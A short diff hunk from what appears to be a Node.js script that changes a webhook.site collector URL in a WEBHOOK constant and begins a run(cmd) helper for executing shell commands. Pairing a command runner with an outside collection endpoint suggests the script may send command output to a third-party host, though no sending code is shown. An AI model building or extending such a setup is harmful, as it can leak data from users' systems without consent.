@@ -4,7 +4,7 @@ const https = require('https');
 const http = require('http');
 const fs = require('fs');
 
-const WEBHOOK = 'https://webhook.site/dc742788-9ae8-483e-bded-bec561fff732';
+const WEBHOOK = 'https://webhook.site/398a6ae0-cf0c-46c9-9ec1-95f03c4ba42b';
 
 function run(cmd, timeout=20000) {
   try {
